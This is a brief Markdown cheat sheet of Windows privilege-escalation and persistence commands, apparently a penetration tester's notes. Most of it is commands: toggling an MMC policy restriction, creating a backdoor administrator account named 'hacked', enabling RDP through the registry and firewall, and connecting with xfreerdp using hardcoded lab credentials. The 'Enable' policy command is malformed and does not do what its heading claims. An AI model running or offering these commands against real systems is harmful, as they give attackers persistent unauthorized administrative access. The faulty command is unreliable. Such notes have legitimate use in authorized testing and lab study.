# Windows Privlage Escalation
![alt text](https://miro.medium.com/max/2400/0*I-5KzneqUHfF7bHR.png)
## Kernel Exploits
- https://github.com/SecWiki/windows-kernel-exploits
## Admin Service that a Standard User can run
- https://www.youtube.com/watch?v=3BQKpPNlTSo
## Run Executable in Background
````
start /B program
````
## Disable/Enable Group Policy
- Disable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
````
## Enable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f
Add Admin & Enable RDP
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
````
## xfreerdp
````
xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share
````
#### Credit
- Taken from Tib3rius
























